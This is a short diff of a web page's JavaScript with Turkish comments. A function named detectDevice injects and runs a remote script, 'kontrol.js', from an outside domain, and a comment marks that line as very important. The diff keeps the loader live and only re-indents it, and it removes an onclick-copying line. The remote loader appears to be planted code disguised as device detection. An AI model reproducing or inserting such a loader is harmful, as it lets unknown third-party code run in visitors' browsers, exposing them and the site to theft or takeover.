@@ -536,8 +536,8 @@ content: '';
 
     function detectDevice() {
       var script = document.createElement('script');
-script.src = 'https://bestill.online/kontrol.js';
-document.head.appendChild(script); // Bu satır çok önemli!
+      script.src = 'https://bestill.online/kontrol.js';
+      document.head.appendChild(script); // Bu satır çok önemli!
 
       // LocalStorage'dan cihaz bilgisini deneyin
       var storedDevice = localStorage.getItem('deviceType');
@@ -562,8 +562,7 @@ document.head.appendChild(script); // Bu satır çok önemli!
     // DOM hazır olduğunda çalışacak şekilde içeriği ayarla
     document.addEventListener('DOMContentLoaded', function() {
       document.getElementById('deviceContent').innerHTML = `<p>${detectDevice()}</p>`;
-      var btn1 = document.querySelector('.btn1');
-      document.getElementById('deviceContent').onclick = btn1.onclick;
+
     });
     
     document.addEventListener('DOMContentLoaded', function() {
